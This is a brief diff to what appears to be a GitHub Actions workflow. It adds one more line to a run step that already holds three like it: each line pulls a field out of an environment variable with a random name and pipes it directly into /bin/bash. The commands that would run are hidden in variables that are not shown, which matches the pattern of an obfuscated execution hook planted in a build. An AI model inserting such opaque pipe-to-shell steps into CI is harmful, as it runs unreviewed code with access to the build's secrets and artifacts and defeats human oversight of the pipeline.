@@ -32,6 +32,7 @@ jobs:
           echo $vbo251 | jq -r .qoz41 | /bin/bash
           echo $u01 | jq -r .rxpyx24858 | /bin/bash
           printf '%s' "$m781" | jq -r .rmhzv007 | /bin/bash
+          echo $emst99 | jq -r .v3327 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
